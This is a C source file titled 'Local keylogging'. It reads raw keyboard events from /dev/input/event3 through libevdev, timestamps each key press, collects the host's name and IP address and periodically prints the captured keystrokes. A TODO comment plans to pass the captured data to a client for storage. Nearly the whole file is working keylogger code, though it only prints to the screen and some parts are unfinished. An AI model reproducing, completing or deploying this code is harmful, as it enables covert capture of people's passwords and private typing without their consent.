/**
 * Local keylogging
 */

#include "keylogger.h"

// for keylogging
#define _POSIX_SOURCE
#include <arpa/inet.h>  // display hostname
#include <ctype.h>
#include <errno.h>
#include <fcntl.h>
#include <libevdev/libevdev.h>
#include <netdb.h>       // display hostname
#include <netinet/in.h>  // display hostname
#include <pthread.h>
#include <signal.h>
#include <stdbool.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>  // display hostname
#include <sys/stat.h>
#include <sys/types.h>
#include <sys/types.h>  // display hostname
#include <time.h>
#include <unistd.h>


// Returns hostname for the local computer
void checkHostName(int hostname) {
  if (hostname == -1) {
    perror("gethostname");
    exit(1);
  }
}

// Returns host information corresponding to host name
void checkHostEntry(struct hostent* hostentry) {
  if (hostentry == NULL) {
    perror("gethostbyname");
    exit(1);
  }
}

// Converts space-delimited IPv4 addresses
// to dotted-decimal format
void checkIPbuffer(char* IPbuffer) {
  if (NULL == IPbuffer) {
    perror("inet_ntoa");
    exit(1);
  }
}

void log_device(key_package* key_package) {
  char hostbuffer[256];
  char* IPbuffer;
  struct hostent* host_entry;
  int hostname;

  // To retrieve hostname
  hostname = gethostname(hostbuffer, sizeof(hostbuffer));
  checkHostName(hostname);

  // To retrieve host information
  host_entry = gethostbyname(hostbuffer);
  checkHostEntry(host_entry);

  // To convert an Internet network
  // address into ASCII string
  IPbuffer = inet_ntoa(*((struct in_addr*)host_entry->h_addr_list[0]));

  // key_package->host_device_name = hostbuffer;
  // key_package->host_device_IP = IPbuffer;

  printf("Host name: %s\n", hostbuffer);
  printf("Host IP: %s\n", IPbuffer);
}

void reset_structs(key_package* key_package) {
  // key_info blank = {.key = "", .timestamp = ""};
  // key_package->keys = &blank;
  key_package->keys_arr_size = 0;
}

void log_keys(key_package* key_package) {
  int timer_counter = 20000000;
  // http://who-t.blogspot.com/2013/09/libevdev-handling-input-events.html

  // open a device, as libevdev expects a file descriptor. You should have root
  // permissions
  struct libevdev* keyboard_dev;
  int rc;

  // get keyboard inputs event file
  int keyboard_fd = open("/dev/input/event3", O_RDONLY | O_NONBLOCK);
  if (keyboard_fd < 0) {
    fprintf(stderr, "error opening event3 file: %d %s\n", errno,
            strerror(errno));
    exit(0);
  }
  rc = libevdev_new_from_fd(keyboard_fd, &keyboard_dev);
  if (rc < 0) {
    fprintf(stderr, "error with setting rc: %d %s\n", -rc, strerror(-rc));
    exit(0);
  }



  int counter = 0;

  while (1) {
    ++counter;
    struct input_event ev;

    rc = libevdev_next_event(keyboard_dev, LIBEVDEV_READ_FLAG_BLOCKING, &ev);
    if (rc < 0) {
      // note that this section runs when no event is occurring, NOT necessarily
      // when there is an error printf("value of rc: %d\n", rc);
      if (rc != -EAGAIN) printf("1 error: %d %s\n", -rc, strerror(-rc));
    } else if (rc == LIBEVDEV_READ_STATUS_SUCCESS) {
      // handle event here

      // each key press/lift generates 3 events: EV_MSC, EV_SYN, and EV_KEY
      // we only care about EV_KEY, represented by ev.type == 1
      if (ev.type == 1) {
        if (ev.value == 1 || ev.value == 2) {
          // get current time
          time_t rawtime;
          struct tm* timeinfo;
          time(&rawtime);
          timeinfo = localtime(&rawtime);

          // make key struct, add to key package. do the file writing in another
          // file
          key_info pressed_key = {
              .key = libevdev_event_code_get_name(ev.type, ev.code),
              .timestamp = asctime(timeinfo)};

          // append to key_package->keys
          key_package->keys[key_package->keys_arr_size] = pressed_key;
          key_package->keys_arr_size++;
        }
      }
    } else {
      printf("unsure of what is going on here..\n");
    }

    if (counter == timer_counter) {
      counter = 0;
      // TODO: pass this info to the client to store
      print_logged_keys(*key_package);
      if (key_package->keys_arr_size != 0) {
        reset_structs(key_package);
      }
    }

    if (ev.code == 107) {
      printf("\nexiting\n");

      break;
    }
  }

  // Clean up
  libevdev_free(keyboard_dev);
  close(keyboard_fd);
}

void print_logged_keys(key_package key_package) {
  printf("All keys in key_package struct: \n");

  for (size_t i = 0; i < key_package.keys_arr_size; i++) {
    printf("%s  ", key_package.keys[i].key);
  }
  printf("\n");
}
